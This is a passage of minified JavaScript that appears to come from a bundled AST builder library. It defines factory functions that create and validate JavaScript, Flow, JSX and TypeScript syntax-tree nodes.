j(Q.value,J,"value",X,1),J}function gl(X){let J={type:"DirectiveLiteral",value:X},Q=E.DirectiveLiteral;return j(Q.value,J,"value",X),J}function ml(X,J=[]){let Q={type:"BlockStatement",body:X,directives:J},Y=E.BlockStatement;return j(Y.body,Q,"body",X,1),j(Y.directives,Q,"directives",J,1),Q}function ul(X=null){let J={type:"BreakStatement",label:X},Q=E.BreakStatement;return j(Q.label,J,"label",X,1),J}function cl(X,J){let Q={type:"CallExpression",callee:X,arguments:J},Y=E.CallExpression;return j(Y.callee,Q,"callee",X,1),j(Y.arguments,Q,"arguments",J,1),Q}function ll(X=null,J){let Q={type:"CatchClause",param:X,body:J},Y=E.CatchClause;return j(Y.param,Q,"param",X,1),j(Y.body,Q,"body",J,1),Q}function pl(X,J,Q){let Y={type:"ConditionalExpression",test:X,consequent:J,alternate:Q},W=E.ConditionalExpression;return j(W.test,Y,"test",X,1),j(W.consequent,Y,"consequent",J,1),j(W.alternate,Y,"alternate",Q,1),Y}function dl(X=null){let J={type:"ContinueStatement",label:X},Q=E.ContinueStatement;return j(Q.label,J,"label",X,1),J}function il(){return{type:"DebuggerStatement"}}function rl(X,J){let Q={type:"DoWhileStatement",test:X,body:J},Y=E.DoWhileStatement;return j(Y.test,Q,"test",X,1),j(Y.body,Q,"body",J,1),Q}function al(){return{type:"EmptyStatement"}}function nl(X){let J={type:"ExpressionStatement",expression:X},Q=E.ExpressionStatement;return j(Q.expression,J,"expression",X,1),J}function sl(X,J=null,Q=null){let Y={type:"File",program:X,comments:J,tokens:Q},W=E.File;return j(W.program,Y,"program",X,1),j(W.comments,Y,"comments",J,1),j(W.tokens,Y,"tokens",Q),Y}function ol(X,J,Q){let Y={type:"ForInStatement",left:X,right:J,body:Q},W=E.ForInStatement;return j(W.left,Y,"left",X,1),j(W.right,Y,"right",J,1),j(W.body,Y,"body",Q,1),Y}function tl(X=null,J=null,Q=null,Y){let W={type:"ForStatement",init:X,test:J,update:Q,body:Y},G=E.ForStatement;return j(G.init,W,"init",X,1),j(G.test,W,"test",J,1),j(G.update,W,"update",Q,1),j(G.body,W,"body",Y,1),W}function el(X=null,J,Q,Y=!1,W=!1){let G={type:"FunctionDeclaration",id:X,params:J,body:Q,generator:Y,async:W},H=E.FunctionDeclaration;return j(H.id,G,"id",X,1),j(H.params,G,"params",J,1),j(H.body,G,"body",Q,1),j(H.generator,G,"generator",Y),j(H.async,G,"async",W),G}function Xp(X=null,J,Q,Y=!1,W=!1){let G={type:"FunctionExpression",id:X,params:J,body:Q,generator:Y,async:W},H=E.FunctionExpression;return j(H.id,G,"id",X,1),j(H.params,G,"params",J,1),j(H.body,G,"body",Q,1),j(H.generator,G,"generator",Y),j(H.async,G,"async",W),G}function Jp(X){let J={type:"Identifier",name:X},Q=E.Identifier;return j(Q.name,J,"name",X),J}function Qp(X,J,Q=null){let Y={type:"IfStatement",test:X,consequent:J,alternate:Q},W=E.IfStatement;return j(W.test,Y,"test",X,1),j(W.consequent,Y,"consequent",J,1),j(W.alternate,Y,"alternate",Q,1),Y}function Yp(X,J){let Q={type:"LabeledStatement",label:X,body:J},Y=E.LabeledStatement;return j(Y.label,Q,"label",X,1),j(Y.body,Q,"body",J,1),Q}function Wp(X){let J={type:"StringLiteral",value:X},Q=E.StringLiteral;return j(Q.value,J,"value",X),J}function oK(X){let J={type:"NumericLiteral",value:X},Q=E.NumericLiteral;return j(Q.value,J,"value",X),J}function Gp(){return{type:"NullLiteral"}}function Hp(X){let J={type:"BooleanLiteral",value:X},Q=E.BooleanLiteral;return j(Q.value,J,"value",X),J}function tK(X,J=""){let Q={type:"RegExpLiteral",pattern:X,flags:J},Y=E.RegExpLiteral;return j(Y.pattern,Q,"pattern",X),j(Y.flags,Q,"flags",J),Q}function zp(X,J,Q){let Y={type:"LogicalExpression",operator:X,left:J,right:Q},W=E.LogicalExpression;return j(W.operator,Y,"operator",X),j(W.left,Y,"left",J,1),j(W.right,Y,"right",Q,1),Y}function $p(X,J,Q=!1,Y=null){let W={type:"MemberExpression",object:X,property:J,computed:Q,optional:Y},G=E.MemberExpression;return j(G.object,W,"object",X,1),j(G.property,W,"property",J,1),j(G.computed,W,"computed",Q),j(G.optional,W,"optional",Y),W}function Vp(X,J){let Q={type:"NewExpression",callee:X,arguments:J},Y=E.NewExpression;return j(Y.callee,Q,"callee",X,1),j(Y.arguments,Q,"arguments",J,1),Q}function Kp(X,J=[],Q="script",Y=null){let W={type:"Program",body:X,directives:J,sourceType:Q,interpreter:Y},G=E.Program;return j(G.body,W,"body",X,1),j(G.directives,W,"directives",J,1),j(G.sourceType,W,"sourceType",Q),j(G.interpreter,W,"interpreter",Y,1),W}function Up(X){let J={type:"ObjectExpression",properties:X},Q=E.ObjectExpression;return j(Q.properties,J,"properties",X,1),J}function Zp(X="method",J,Q,Y,W=!1,G=!1,H=!1){let z={type:"ObjectMethod",kind:X,key:J,params:Q,body:Y,computed:W,generator:G,async:H},$=E.ObjectMethod;return j($.kind,z,"kind",X),j($.key,z,"key",J,1),j($.params,z,"params",Q,1),j($.body,z,"body",Y,1),j($.computed,z,"computed",W),j($.generator,z,"generator",G),j($.async,z,"async",H),z}function qp(X,J,Q=!1,Y=!1,W=null){let G={type:"ObjectProperty",key:X,value:J,computed:Q,shorthand:Y,decorators:W},H=E.ObjectProperty;return j(H.key,G,"key",X,1),j(H.value,G,"value",J,1),j(H.computed,G,"computed",Q),j(H.shorthand,G,"shorthand",Y),j(H.decorators,G,"decorators",W,1),G}function eK(X){let J={type:"RestElement",argument:X},Q=E.RestElement;return j(Q.argument,J,"argument",X,1),J}function Bp(X=null){let J={type:"ReturnStatement",argument:X},Q=E.ReturnStatement;return j(Q.argument,J,"argument",X,1),J}function Mp(X){let J={type:"SequenceExpression",expressions:X},Q=E.SequenceExpression;return j(Q.expressions,J,"expressions",X,1),J}function jp(X){let J={type:"ParenthesizedExpression",expression:X},Q=E.ParenthesizedExpression;return j(Q.expression,J,"expression",X,1),J}function Op(X=null,J){let Q={type:"SwitchCase",test:X,consequent:J},Y=E.SwitchCase;return j(Y.test,Q,"test",X,1),j(Y.consequent,Q,"consequent",J,1),Q}function Fp(X,J){let Q={type:"SwitchStatement",discriminant:X,cases:J},Y=E.SwitchStatement;return j(Y.discriminant,Q,"discriminant",X,1),j(Y.cases,Q,"cases",J,1),Q}function Rp(){return{type:"ThisExpression"}}function Ap(X){let J={type:"ThrowStatement",argument:X},Q=E.ThrowStatement;return j(Q.argument,J,"argument",X,1),J}function Dp(X,J=null,Q=null){let Y={type:"TryStatement",block:X,handler:J,finalizer:Q},W=E.TryStatement;return j(W.block,Y,"block",X,1),j(W.handler,Y,"handler",J,1),j(W.finalizer,Y,"finalizer",Q,1),Y}function wp(X,J,Q=!0){let Y={type:"UnaryExpression",operator:X,argument:J,prefix:Q},W=E.UnaryExpression;return j(W.operator,Y,"operator",X),j(W.argument,Y,"argument",J,1),j(W.prefix,Y,"prefix",Q),Y}function Np(X,J,Q=!1){let Y={type:"UpdateExpression",operator:X,argument:J,prefix:Q},W=E.UpdateExpression;return j(W.operator,Y,"operator",X),j(W.argument,Y,"argument",J,1),j(W.prefix,Y,"prefix",Q),Y}function Lp(X,J){let Q={type:"VariableDeclaration",kind:X,declarations:J},Y=E.VariableDeclaration;return j(Y.kind,Q,"kind",X),j(Y.declarations,Q,"declarations",J,1),Q}function Ip(X,J=null){let Q={type:"VariableDeclarator",id:X,init:J},Y=E.VariableDeclarator;return j(Y.id,Q,"id",X,1),j(Y.init,Q,"init",J,1),Q}function Cp(X,J){let Q={type:"WhileStatement",test:X,body:J},Y=E.WhileStatement;return j(Y.test,Q,"test",X,1),j(Y.body,Q,"body",J,1),Q}function Pp(X,J){let Q={type:"WithStatement",object:X,body:J},Y=E.WithStatement;return j(Y.object,Q,"object",X,1),j(Y.body,Q,"body",J,1),Q}function Sp(X,J){let Q={type:"AssignmentPattern",left:X,right:J},Y=E.AssignmentPattern;return j(Y.left,Q,"left",X,1),j(Y.right,Q,"right",J,1),Q}function Tp(X){let J={type:"ArrayPattern",elements:X},Q=E.ArrayPattern;return j(Q.elements,J,"elements",X,1),J}function _p(X,J,Q=!1){let Y={type:"ArrowFunctionExpression",params:X,body:J,async:Q,expression:null},W=E.ArrowFunctionExpression;return j(W.params,Y,"params",X,1),j(W.body,Y,"body",J,1),j(W.async,Y,"async",Q),Y}function Ep(X){let J={type:"ClassBody",body:X},Q=E.ClassBody;return j(Q.body,J,"body",X,1),J}function kp(X=null,J=null,Q,Y=null){let W={type:"ClassExpression",id:X,superClass:J,body:Q,decorators:Y},G=E.ClassExpression;return j(G.id,W,"id",X,1),j(G.superClass,W,"superClass",J,1),j(G.body,W,"body",Q,1),j(G.decorators,W,"decorators",Y,1),W}function bp(X=null,J=null,Q,Y=null){let W={type:"ClassDeclaration",id:X,superClass:J,body:Q,decorators:Y},G=E.ClassDeclaration;return j(G.id,W,"id",X,1),j(G.superClass,W,"superClass",J,1),j(G.body,W,"body",Q,1),j(G.decorators,W,"decorators",Y,1),W}function vp(X){let J={type:"ExportAllDeclaration",source:X},Q=E.ExportAllDeclaration;return j(Q.source,J,"source",X,1),J}function fp(X){let J={type:"ExportDefaultDeclaration",declaration:X},Q=E.ExportDefaultDeclaration;return j(Q.declaration,J,"declaration",X,1),J}function xp(X=null,J=[],Q=null){let Y={type:"ExportNamedDeclaration",declaration:X,specifiers:J,source:Q},W=E.ExportNamedDeclaration;return j(W.declaration,Y,"declaration",X,1),j(W.specifiers,Y,"specifiers",J,1),j(W.source,Y,"source",Q,1),Y}function hp(X,J){let Q={type:"ExportSpecifier",local:X,exported:J},Y=E.ExportSpecifier;return j(Y.local,Q,"local",X,1),j(Y.exported,Q,"exported",J,1),Q}function yp(X,J,Q,Y=!1){let W={type:"ForOfStatement",left:X,right:J,body:Q,await:Y},G=E.ForOfStatement;return j(G.left,W,"left",X,1),j(G.right,W,"right",J,1),j(G.body,W,"body",Q,1),j(G.await,W,"await",Y),W}function gp(X,J){let Q={type:"ImportDeclaration",specifiers:X,source:J},Y=E.ImportDeclaration;return j(Y.specifiers,Q,"specifiers",X,1),j(Y.source,Q,"source",J,1),Q}function mp(X){let J={type:"ImportDefaultSpecifier",local:X},Q=E.ImportDefaultSpecifier;return j(Q.local,J,"local",X,1),J}function up(X){let J={type:"ImportNamespaceSpecifier",local:X},Q=E.ImportNamespaceSpecifier;return j(Q.local,J,"local",X,1),J}function cp(X,J){let Q={type:"ImportSpecifier",local:X,imported:J},Y=E.ImportSpecifier;return j(Y.local,Q,"local",X,1),j(Y.imported,Q,"imported",J,1),Q}function lp(X,J=null){let Q={type:"ImportExpression",source:X,options:J},Y=E.ImportExpression;return j(Y.source,Q,"source",X,1),j(Y.options,Q,"options",J,1),Q}function pp(X,J){let Q={type:"MetaProperty",meta:X,property:J},Y=E.MetaProperty;return j(Y.meta,Q,"meta",X,1),j(Y.property,Q,"property",J,1),Q}function dp(X="method",J,Q,Y,W=!1,G=!1,H=!1,z=!1){let $={type:"ClassMethod",kind:X,key:J,params:Q,body:Y,computed:W,static:G,generator:H,async:z},V=E.ClassMethod;return j(V.kind,$,"kind",X),j(V.key,$,"key",J,1),j(V.params,$,"params",Q,1),j(V.body,$,"body",Y,1),j(V.computed,$,"computed",W),j(V.static,$,"static",G),j(V.generator,$,"generator",H),j(V.async,$,"async",z),$}function ip(X){let J={type:"ObjectPattern",properties:X},Q=E.ObjectPattern;return j(Q.properties,J,"properties",X,1),J}function XU(X){let J={type:"SpreadElement",argument:X},Q=E.SpreadElement;return j(Q.argument,J,"argument",X,1),J}function rp(){return{type:"Super"}}function ap(X,J){let Q={type:"TaggedTemplateExpression",tag:X,quasi:J},Y=E.TaggedTemplateExpression;return j(Y.tag,Q,"tag",X,1),j(Y.quasi,Q,"quasi",J,1),Q}function np(X,J=!1){let Q={type:"TemplateElement",value:X,tail:J},Y=E.TemplateElement;return j(Y.value,Q,"value",X),j(Y.tail,Q,"tail",J),Q}function sp(X,J){let Q={type:"TemplateLiteral",quasis:X,expressions:J},Y=E.TemplateLiteral;return j(Y.quasis,Q,"quasis",X,1),j(Y.expressions,Q,"expressions",J,1),Q}function op(X=null,J=!1){let Q={type:"YieldExpression",argument:X,delegate:J},Y=E.YieldExpression;return j(Y.argument,Q,"argument",X,1),j(Y.delegate,Q,"delegate",J),Q}function tp(X){let J={type:"AwaitExpression",argument:X},Q=E.AwaitExpression;return j(Q.argument,J,"argument",X,1),J}function ep(){return{type:"Import"}}function Xd(X){let J={type:"ExportNamespaceSpecifier",exported:X},Q=E.ExportNamespaceSpecifier;return j(Q.exported,J,"exported",X,1),J}function Jd(X,J,Q=!1,Y){let W={type:"OptionalMemberExpression",object:X,property:J,computed:Q,optional:Y},G=E.OptionalMemberExpression;return j(G.object,W,"object",X,1),j(G.property,W,"property",J,1),j(G.computed,W,"computed",Q),j(G.optional,W,"optional",Y),W}function Qd(X,J,Q){let Y={type:"OptionalCallExpression",callee:X,arguments:J,optional:Q},W=E.OptionalCallExpression;return j(W.callee,Y,"callee",X,1),j(W.arguments,Y,"arguments",J,1),j(W.optional,Y,"optional",Q),Y}function Yd(X,J=null,Q=null,Y=null,W=!1,G=!1){let H={type:"ClassProperty",key:X,value:J,typeAnnotation:Q,decorators:Y,computed:W,static:G},z=E.ClassProperty;return j(z.key,H,"key",X,1),j(z.value,H,"value",J,1),j(z.typeAnnotation,H,"typeAnnotation",Q,1),j(z.decorators,H,"decorators",Y,1),j(z.computed,H,"computed",W),j(z.static,H,"static",G),H}function Wd(X,J=null,Q=null,Y=null,W=!1,G=!1){let H={type:"ClassAccessorProperty",key:X,value:J,typeAnnotation:Q,decorators:Y,computed:W,static:G},z=E.ClassAccessorProperty;return j(z.key,H,"key",X,1),j(z.value,H,"value",J,1),j(z.typeAnnotation,H,"typeAnnotation",Q,1),j(z.decorators,H,"decorators",Y,1),j(z.computed,H,"computed",W),j(z.static,H,"static",G),H}function Gd(X,J=null,Q=null,Y=!1){let W={type:"ClassPrivateProperty",key:X,value:J,decorators:Q,static:Y},G=E.ClassPrivateProperty;return j(G.key,W,"key",X,1),j(G.value,W,"value",J,1),j(G.decorators,W,"decorators",Q,1),j(G.static,W,"static",Y),W}function Hd(X="method",J,Q,Y,W=!1){let G={type:"ClassPrivateMethod",kind:X,key:J,params:Q,body:Y,static:W},H=E.ClassPrivateMethod;return j(H.kind,G,"kind",X),j(H.key,G,"key",J,1),j(H.params,G,"params",Q,1),j(H.body,G,"body",Y,1),j(H.static,G,"static",W),G}function zd(X){let J={type:"PrivateName",id:X},Q=E.PrivateName;return j(Q.id,J,"id",X,1),J}function $d(X){let J={type:"StaticBlock",body:X},Q=E.StaticBlock;return j(Q.body,J,"body",X,1),J}function Vd(X,J){let Q={type:"ImportAttribute",key:X,value:J},Y=E.ImportAttribute;return j(Y.key,Q,"key",X,1),j(Y.value,Q,"value",J,1),Q}function Kd(){return{type:"AnyTypeAnnotation"}}function Ud(X){let J={type:"ArrayTypeAnnotation",elementType:X},Q=E.ArrayTypeAnnotation;return j(Q.elementType,J,"elementType",X,1),J}function Zd(){return{type:"BooleanTypeAnnotation"}}function qd(X){let J={type:"BooleanLiteralTypeAnnotation",value:X},Q=E.BooleanLiteralTypeAnnotation;return j(Q.value,J,"value",X),J}function Bd(){return{type:"NullLiteralTypeAnnotation"}}function Md(X,J=null){let Q={type:"ClassImplements",id:X,typeParameters:J},Y=E.ClassImplements;return j(Y.id,Q,"id",X,1),j(Y.typeParameters,Q,"typeParameters",J,1),Q}function jd(X,J=null,Q=null,Y){let W={type:"DeclareClass",id:X,typeParameters:J,extends:Q,body:Y},G=E.DeclareClass;return j(G.id,W,"id",X,1),j(G.typeParameters,W,"typeParameters",J,1),j(G.extends,W,"extends",Q,1),j(G.body,W,"body",Y,1),W}function Od(X){let J={type:"DeclareFunction",id:X},Q=E.DeclareFunction;return j(Q.id,J,"id",X,1),J}function Fd(X,J=null,Q=null,Y){let W={type:"DeclareInterface",id:X,typeParameters:J,extends:Q,body:Y},G=E.DeclareInterface;return j(G.id,W,"id",X,1),j(G.typeParameters,W,"typeParameters",J,1),j(G.extends,W,"extends",Q,1),j(G.body,W,"body",Y,1),W}function Rd(X,J,Q=null){let Y={type:"DeclareModule",id:X,body:J,kind:Q},W=E.DeclareModule;return j(W.id,Y,"id",X,1),j(W.body,Y,"body",J,1),j(W.kind,Y,"kind",Q),Y}function Ad(X){let J={type:"DeclareModuleExports",typeAnnotation:X},Q=E.DeclareModuleExports;return j(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function Dd(X,J=null,Q){let Y={type:"DeclareTypeAlias",id:X,typeParameters:J,right:Q},W=E.DeclareTypeAlias;return j(W.id,Y,"id",X,1),j(W.typeParameters,Y,"typeParameters",J,1),j(W.right,Y,"right",Q,1),Y}function wd(X,J=null,Q=null){let Y={type:"DeclareOpaqueType",id:X,typeParameters:J,supertype:Q},W=E.DeclareOpaqueType;return j(W.id,Y,"id",X,1),j(W.typeParameters,Y,"typeParameters",J,1),j(W.supertype,Y,"supertype",Q,1),Y}function Nd(X){let J={type:"DeclareVariable",id:X},Q=E.DeclareVariable;return j(Q.id,J,"id",X,1),J}function Ld(X=null,J=null,Q=null,Y=null){let W={type:"DeclareExportDeclaration",declaration:X,specifiers:J,source:Q,attributes:Y},G=E.DeclareExportDeclaration;return j(G.declaration,W,"declaration",X,1),j(G.specifiers,W,"specifiers",J,1),j(G.source,W,"source",Q,1),j(G.attributes,W,"attributes",Y,1),W}function Id(X,J=null){let Q={type:"DeclareExportAllDeclaration",source:X,attributes:J},Y=E.DeclareExportAllDeclaration;return j(Y.source,Q,"source",X,1),j(Y.attributes,Q,"attributes",J,1),Q}function Cd(X){let J={type:"DeclaredPredicate",value:X},Q=E.DeclaredPredicate;return j(Q.value,J,"value",X,1),J}function Pd(){return{type:"ExistsTypeAnnotation"}}function Sd(X=null,J,Q=null,Y){let W={type:"FunctionTypeAnnotation",typeParameters:X,params:J,rest:Q,returnType:Y},G=E.FunctionTypeAnnotation;return j(G.typeParameters,W,"typeParameters",X,1),j(G.params,W,"params",J,1),j(G.rest,W,"rest",Q,1),j(G.returnType,W,"returnType",Y,1),W}function Td(X=null,J){let Q={type:"FunctionTypeParam",name:X,typeAnnotation:J},Y=E.FunctionTypeParam;return j(Y.name,Q,"name",X,1),j(Y.typeAnnotation,Q,"typeAnnotation",J,1),Q}function _d(X,J=null){let Q={type:"GenericTypeAnnotation",id:X,typeParameters:J},Y=E.GenericTypeAnnotation;return j(Y.id,Q,"id",X,1),j(Y.typeParameters,Q,"typeParameters",J,1),Q}function Ed(){return{type:"InferredPredicate"}}function kd(X,J=null){let Q={type:"InterfaceExtends",id:X,typeParameters:J},Y=E.InterfaceExtends;return j(Y.id,Q,"id",X,1),j(Y.typeParameters,Q,"typeParameters",J,1),Q}function bd(X,J=null,Q=null,Y){let W={type:"InterfaceDeclaration",id:X,typeParameters:J,extends:Q,body:Y},G=E.InterfaceDeclaration;return j(G.id,W,"id",X,1),j(G.typeParameters,W,"typeParameters",J,1),j(G.extends,W,"extends",Q,1),j(G.body,W,"body",Y,1),W}function vd(X=null,J){let Q={type:"InterfaceTypeAnnotation",extends:X,body:J},Y=E.InterfaceTypeAnnotation;return j(Y.extends,Q,"extends",X,1),j(Y.body,Q,"body",J,1),Q}function fd(X){let J={type:"IntersectionTypeAnnotation",types:X},Q=E.IntersectionTypeAnnotation;return j(Q.types,J,"types",X,1),J}function xd(){return{type:"MixedTypeAnnotation"}}function hd(){return{type:"EmptyTypeAnnotation"}}function yd(X){let J={type:"NullableTypeAnnotation",typeAnnotation:X},Q=E.NullableTypeAnnotation;return j(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function gd(X){let J={type:"NumberLiteralTypeAnnotation",value:X},Q=E.NumberLiteralTypeAnnotation;return j(Q.value,J,"value",X),J}function md(){return{type:"NumberTypeAnnotation"}}function ud(X,J=[],Q=[],Y=[],W=!1){let G={type:"ObjectTypeAnnotation",properties:X,indexers:J,callProperties:Q,internalSlots:Y,exact:W},H=E.ObjectTypeAnnotation;return j(H.properties,G,"properties",X,1),j(H.indexers,G,"indexers",J,1),j(H.callProperties,G,"callProperties",Q,1),j(H.internalSlots,G,"internalSlots",Y,1),j(H.exact,G,"exact",W),G}function cd(X,J,Q,Y,W){let G={type:"ObjectTypeInternalSlot",id:X,value:J,optional:Q,static:Y,method:W},H=E.ObjectTypeInternalSlot;return j(H.id,G,"id",X,1),j(H.value,G,"value",J,1),j(H.optional,G,"optional",Q),j(H.static,G,"static",Y),j(H.method,G,"method",W),G}function ld(X){let J={type:"ObjectTypeCallProperty",value:X,static:null},Q=E.ObjectTypeCallProperty;return j(Q.value,J,"value",X,1),J}function pd(X=null,J,Q,Y=null){let W={type:"ObjectTypeIndexer",id:X,key:J,value:Q,variance:Y,static:null},G=E.ObjectTypeIndexer;return j(G.id,W,"id",X,1),j(G.key,W,"key",J,1),j(G.value,W,"value",Q,1),j(G.variance,W,"variance",Y,1),W}function dd(X,J,Q=null){let Y={type:"ObjectTypeProperty",key:X,value:J,variance:Q,kind:null,method:null,optional:null,proto:null,static:null},W=E.ObjectTypeProperty;return j(W.key,Y,"key",X,1),j(W.value,Y,"value",J,1),j(W.variance,Y,"variance",Q,1),Y}function id(X){let J={type:"ObjectTypeSpreadProperty",argument:X},Q=E.ObjectTypeSpreadProperty;return j(Q.argument,J,"argument",X,1),J}function rd(X,J=null,Q=null,Y){let W={type:"OpaqueType",id:X,typeParameters:J,supertype:Q,impltype:Y},G=E.OpaqueType;return j(G.id,W,"id",X,1),j(G.typeParameters,W,"typeParameters",J,1),j(G.supertype,W,"supertype",Q,1),j(G.impltype,W,"impltype",Y,1),W}function ad(X,J){let Q={type:"QualifiedTypeIdentifier",id:X,qualification:J},Y=E.QualifiedTypeIdentifier;return j(Y.id,Q,"id",X,1),j(Y.qualification,Q,"qualification",J,1),Q}function nd(X){let J={type:"StringLiteralTypeAnnotation",value:X},Q=E.StringLiteralTypeAnnotation;return j(Q.value,J,"value",X),J}function sd(){return{type:"StringTypeAnnotation"}}function od(){return{type:"SymbolTypeAnnotation"}}function td(){return{type:"ThisTypeAnnotation"}}function ed(X){let J={type:"TupleTypeAnnotation",types:X},Q=E.TupleTypeAnnotation;return j(Q.types,J,"types",X,1),J}function Xi(X){let J={type:"TypeofTypeAnnotation",argument:X},Q=E.TypeofTypeAnnotation;return j(Q.argument,J,"argument",X,1),J}function Ji(X,J=null,Q){let Y={type:"TypeAlias",id:X,typeParameters:J,right:Q},W=E.TypeAlias;return j(W.id,Y,"id",X,1),j(W.typeParameters,Y,"typeParameters",J,1),j(W.right,Y,"right",Q,1),Y}function Qi(X){let J={type:"TypeAnnotation",typeAnnotation:X},Q=E.TypeAnnotation;return j(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function Yi(X,J){let Q={type:"TypeCastExpression",expression:X,typeAnnotation:J},Y=E.TypeCastExpression;return j(Y.expression,Q,"expression",X,1),j(Y.typeAnnotation,Q,"typeAnnotation",J,1),Q}function Wi(X=null,J=null,Q=null){let Y={type:"TypeParameter",bound:X,default:J,variance:Q,name:null},W=E.TypeParameter;return j(W.bound,Y,"bound",X,1),j(W.default,Y,"default",J,1),j(W.variance,Y,"variance",Q,1),Y}function Gi(X){let J={type:"TypeParameterDeclaration",params:X},Q=E.TypeParameterDeclaration;return j(Q.params,J,"params",X,1),J}function Hi(X){let J={type:"TypeParameterInstantiation",params:X},Q=E.TypeParameterInstantiation;return j(Q.params,J,"params",X,1),J}function zi(X){let J={type:"UnionTypeAnnotation",types:X},Q=E.UnionTypeAnnotation;return j(Q.types,J,"types",X,1),J}function $i(X){let J={type:"Variance",kind:X},Q=E.Variance;return j(Q.kind,J,"kind",X),J}function Vi(){return{type:"VoidTypeAnnotation"}}function Ki(X,J){let Q={type:"EnumDeclaration",id:X,body:J},Y=E.EnumDeclaration;return j(Y.id,Q,"id",X,1),j(Y.body,Q,"body",J,1),Q}function Ui(X){let J={type:"EnumBooleanBody",members:X,explicitType:null,hasUnknownMembers:null},Q=E.EnumBooleanBody;return j(Q.members,J,"members",X,1),J}function Zi(X){let J={type:"EnumNumberBody",members:X,explicitType:null,hasUnknownMembers:null},Q=E.EnumNumberBody;return j(Q.members,J,"members",X,1),J}function qi(X){let J={type:"EnumStringBody",members:X,explicitType:null,hasUnknownMembers:null},Q=E.EnumStringBody;return j(Q.members,J,"members",X,1),J}function Bi(X){let J={type:"EnumSymbolBody",members:X,hasUnknownMembers:null},Q=E.EnumSymbolBody;return j(Q.members,J,"members",X,1),J}function Mi(X){let J={type:"EnumBooleanMember",id:X,init:null},Q=E.EnumBooleanMember;return j(Q.id,J,"id",X,1),J}function ji(X,J){let Q={type:"EnumNumberMember",id:X,init:J},Y=E.EnumNumberMember;return j(Y.id,Q,"id",X,1),j(Y.init,Q,"init",J,1),Q}function Oi(X,J){let Q={type:"EnumStringMember",id:X,init:J},Y=E.EnumStringMember;return j(Y.id,Q,"id",X,1),j(Y.init,Q,"init",J,1),Q}function Fi(X){let J={type:"EnumDefaultedMember",id:X},Q=E.EnumDefaultedMember;return j(Q.id,J,"id",X,1),J}function Ri(X,J){let Q={type:"IndexedAccessType",objectType:X,indexType:J},Y=E.IndexedAccessType;return j(Y.objectType,Q,"objectType",X,1),j(Y.indexType,Q,"indexType",J,1),Q}function Ai(X,J){let Q={type:"OptionalIndexedAccessType",objectType:X,indexType:J,optional:null},Y=E.OptionalIndexedAccessType;return j(Y.objectType,Q,"objectType",X,1),j(Y.indexType,Q,"indexType",J,1),Q}function Di(X,J=null){let Q={type:"JSXAttribute",name:X,value:J},Y=E.JSXAttribute;return j(Y.name,Q,"name",X,1),j(Y.value,Q,"value",J,1),Q}function wi(X){let J={type:"JSXClosingElement",name:X},Q=E.JSXClosingElement;return j(Q.name,J,"name",X,1),J}function Ni(X,J=null,Q,Y=null){let W={type:"JSXElement",openingElement:X,closingElement:J,children:Q,selfClosing:Y},G=E.JSXElement;return j(G.openingElement,W,"openingElement",X,1),j(G.closingElement,W,"closingElement",J,1),j(G.children,W,"children",Q,1),j(G.selfClosing,W,"selfClosing",Y),W}function Li(){return{type:"JSXEmptyExpression"}}function Ii(X){let J={type:"JSXExpressionContainer",expression:X},Q=E.JSXExpressionContainer;return j(Q.expression,J,"expression",X,1),J}function Ci(X){let J={type:"JSXSpreadChild",expression:X},Q=E.JSXSpreadChild;return j(Q.expression,J,"expression",X,1),J}function Pi(X){let J={type:"JSXIdentifier",name:X},Q=E.JSXIdentifier;return j(Q.name,J,"name",X),J}function Si(X,J){let Q={type:"JSXMemberExpression",object:X,property:J},Y=E.JSXMemberExpression;return j(Y.object,Q,"object",X,1),j(Y.property,Q,"property",J,1),Q}function Ti(X,J){let Q={type:"JSXNamespacedName",namespace:X,name:J},Y=E.JSXNamespacedName;return j(Y.namespace,Q,"namespace",X,1),j(Y.name,Q,"name",J,1),Q}function _i(X,J,Q=!1){let Y={type:"JSXOpeningElement",name:X,attributes:J,selfClosing:Q},W=E.JSXOpeningElement;return j(W.name,Y,"name",X,1),j(W.attributes,Y,"attributes",J,1),j(W.selfClosing,Y,"selfClosing",Q),Y}function Ei(X){let J={type:"JSXSpreadAttribute",argument:X},Q=E.JSXSpreadAttribute;return j(Q.argument,J,"argument",X,1),J}function ki(X){let J={type:"JSXText",value:X},Q=E.JSXText;return j(Q.value,J,"value",X),J}function bi(X,J,Q){let Y={type:"JSXFragment",openingFragment:X,closingFragment:J,children:Q},W=E.JSXFragment;return j(W.openingFragment,Y,"openingFragment",X,1),j(W.closingFragment,Y,"closingFragment",J,1),j(W.children,Y,"children",Q,1),Y}function vi(){return{type:"JSXOpeningFragment"}}function fi(){return{type:"JSXClosingFragment"}}function xi(){return{type:"Noop"}}function hi(X,J){let Q={type:"Placeholder",expectedNode:X,name:J},Y=E.Placeholder;return j(Y.expectedNode,Q,"expectedNode",X),j(Y.name,Q,"name",J,1),Q}function yi(X){let J={type:"V8IntrinsicIdentifier",name:X},Q=E.V8IntrinsicIdentifier;return j(Q.name,J,"name",X),J}function gi(){return{type:"ArgumentPlaceholder"}}function mi(X,J){let Q={type:"BindExpression",object:X,callee:J},Y=E.BindExpression;return j(Y.object,Q,"object",X,1),j(Y.callee,Q,"callee",J,1),Q}function ui(X){let J={type:"Decorator",expression:X},Q=E.Decorator;return j(Q.expression,J,"expression",X,1),J}function ci(X,J=!1){let Q={type:"DoExpression",body:X,async:J},Y=E.DoExpression;return j(Y.body,Q,"body",X,1),j(Y.async,Q,"async",J),Q}function li(X){let J={type:"ExportDefaultSpecifier",exported:X},Q=E.ExportDefaultSpecifier;return j(Q.exported,J,"exported",X,1),J}function pi(X){let J={type:"RecordExpression",properties:X},Q=E.RecordExpression;return j(Q.properties,J,"properties",X,1),J}function di(X=[]){let J={type:"TupleExpression",elements:X},Q=E.TupleExpression;return j(Q.elements,J,"elements",X,1),J}function ii(X){let J={type:"DecimalLiteral",value:X},Q=E.DecimalLiteral;return j(Q.value,J,"value",X),J}function ri(X){let J={type:"ModuleExpression",body:X},Q=E.ModuleExpression;return j(Q.body,J,"body",X,1),J}function ai(){return{type:"TopicReference"}}function ni(X){let J={type:"PipelineTopicExpression",expression:X},Q=E.PipelineTopicExpression;return j(Q.expression,J,"expression",X,1),J}function si(X){let J={type:"PipelineBareFunction",callee:X},Q=E.PipelineBareFunction;return j(Q.callee,J,"callee",X,1),J}function oi(){return{type:"PipelinePrimaryTopicReference"}}function ti(){return{type:"VoidPattern"}}function ei(X){let J={type:"TSParameterProperty",parameter:X},Q=E.TSParameterProperty;return j(Q.parameter,J,"parameter",X,1),J}function 